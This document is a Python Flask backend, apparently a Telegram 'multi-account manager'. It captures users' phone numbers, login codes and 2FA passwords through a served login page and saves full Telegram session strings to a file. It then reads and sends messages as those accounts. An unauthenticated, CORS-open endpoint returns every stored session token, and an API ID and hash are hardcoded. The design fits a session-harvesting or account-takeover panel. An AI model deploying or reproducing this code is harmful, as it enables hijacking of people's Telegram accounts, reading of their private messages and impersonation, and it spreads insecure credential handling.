from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import nest_asyncio
from datetime import datetime

# Apply nest_asyncio for Render
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently
accounts = []
ACCOUNTS_FILE = 'accounts.json'

# Load existing accounts if file exists
if os.path.exists(ACCOUNTS_FILE):
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = json.load(f)
        print(f"✅ Loaded {len(accounts)} accounts")
    except Exception as e:
        print(f"⚠️ Error loading accounts: {e}")
        accounts = []
else:
    print("📝 No existing accounts file, will create when adding first account")

def save_accounts():
    """Save accounts to file"""
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        print(f"💾 Saved {len(accounts)} accounts")
        return True
    except Exception as e:
        print(f"❌ Error saving accounts: {e}")
        return False

# Helper to run async functions
def run_async(coro):
    """Run async coroutine in a new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

# -------------------- SEND OTP --------------------
@app.route('/api/add-account', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    try:
        # Create client with empty string session
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        run_async(client.connect())
        result = run_async(client.send_code_request(phone))
        session_str = client.session.save()
        run_async(client.disconnect())
        
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'session_str': session_str
        }
        print(f"📱 OTP sent to {phone}")
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        print(f"Error sending OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- VERIFY OTP --------------------
@app.route('/api/verify-code', methods=['POST'])
def verify_otp():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']
    
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        run_async(client.connect())
        
        try:
            run_async(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
            me = run_async(client.get_me())
            string_session = client.session.save()
            run_async(client.disconnect())
            
            # Save account
            account = {
                'id': len(accounts) + 1,
                'phone': phone,
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': string_session,
                'date': str(datetime.now())
            }
            accounts.append(account)
            save_accounts()
            del temp_data[session_id]
            print(f"✅ Account added: {phone}")
            return jsonify({'success': True, 'account': account})
            
        except errors.SessionPasswordNeededError:
            if password:
                run_async(client.sign_in(password=password))
                me = run_async(client.get_me())
                string_session = client.session.save()
                run_async(client.disconnect())
                
                account = {
                    'id': len(accounts) + 1,
                    'phone': phone,
                    'name': me.first_name or 'User',
                    'username': me.username or '',
                    'session': string_session,
                    'date': str(datetime.now())
                }
                accounts.append(account)
                save_accounts()
                del temp_data[session_id]
                print(f"✅ Account added: {phone} (with 2FA)")
                return jsonify({'success': True, 'account': account})
            else:
                run_async(client.disconnect())
                return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
        except Exception as e:
            run_async(client.disconnect())
            return jsonify({'success': False, 'error': str(e)})
            
    except Exception as e:
        print(f"Error verifying code: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET ACCOUNTS --------------------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Return all accounts with proper formatting"""
    account_list = []
    for a in accounts:
        account_list.append({
            'id': a['id'],
            'phone': a['phone'],
            'name': a.get('name', 'User'),
            'username': a.get('username', ''),
            'session': a.get('session', a.get('string_session', ''))
        })
    return jsonify({'success': True, 'accounts': account_list})

# -------------------- GET MESSAGES --------------------
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        run_async(client.connect())
        
        if not run_async(client.is_user_authorized()):
            run_async(client.disconnect())
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        dialogs = run_async(client.get_dialogs(limit=50))
        chats = []
        all_messages = []
        
        for dialog in dialogs:
            # Get chat name
            if dialog.is_user:
                name = dialog.entity.first_name or 'Unknown'
                if dialog.entity.last_name:
                    name += f" {dialog.entity.last_name}"
            elif dialog.is_group or dialog.is_channel:
                name = dialog.name or 'Unknown'
            else:
                name = dialog.name or 'Unknown'
            
            chat_id = str(dialog.id)
            
            # Add chat to list
            chats.append({
                'id': chat_id,
                'title': name,
                'unread': dialog.unread_count or 0,
                'lastMessage': dialog.message.text[:50] + '...' if dialog.message and dialog.message.text else '',
                'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
            })
            
            # Get last 15 messages
            try:
                msgs = run_async(client.get_messages(dialog.entity, limit=15))
                for msg in msgs:
                    if msg and msg.text:
                        all_messages.append({
                            'chatId': chat_id,
                            'text': msg.text,
                            'date': msg.date.timestamp(),
                            'out': msg.out
                        })
            except Exception as e:
                print(f"Error getting messages for {name}: {e}")
                continue
        
        run_async(client.disconnect())
        
        return jsonify({
            'success': True, 
            'chats': chats, 
            'messages': all_messages
        })
        
    except Exception as e:
        print(f"Error getting messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- SEND MESSAGE --------------------
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not message:
        return jsonify({'success': False, 'error': 'Message cannot be empty'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        run_async(client.connect())
        
        if not run_async(client.is_user_authorized()):
            run_async(client.disconnect())
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        # Try to get entity with different methods
        try:
            entity = run_async(client.get_entity(int(chat_id)))
        except:
            try:
                entity = run_async(client.get_entity(chat_id))
            except:
                run_async(client.disconnect())
                return jsonify({'success': False, 'error': 'Chat not found'})
        
        # Send message
        run_async(client.send_message(entity, message))
        run_async(client.disconnect())
        
        return jsonify({'success': True})
        
    except Exception as e:
        print(f"Error sending message: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- REMOVE ACCOUNT --------------------
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    global accounts
    original_count = len(accounts)
    accounts = [a for a in accounts if a['id'] != account_id]
    
    if len(accounts) < original_count:
        save_accounts()
        print(f"🗑️ Removed account {account_id}")
        return jsonify({'success': True})
    else:
        return jsonify({'success': False, 'error': 'Account not found'})

# -------------------- HEALTH CHECK --------------------
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_data)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*60)
    print('📱 TELEGRAM MANAGER - MULTI-ACCOUNT SERVER')
    print('='*60)
    print(f'✅ Loaded {len(accounts)} accounts')
    print(f'✅ API endpoints:')
    print('   - /api/accounts (GET)')
    print('   - /api/add-account (POST)')
    print('   - /api/verify-code (POST)')
    print('   - /api/get-messages (POST)')
    print('   - /api/send-message (POST)')
    print('   - /api/remove-account (POST)')
    print('   - /api/health (GET)')
    print('='*60 + '\n')
    
    app.run(host='0.0.0.0', port=port, debug=False)
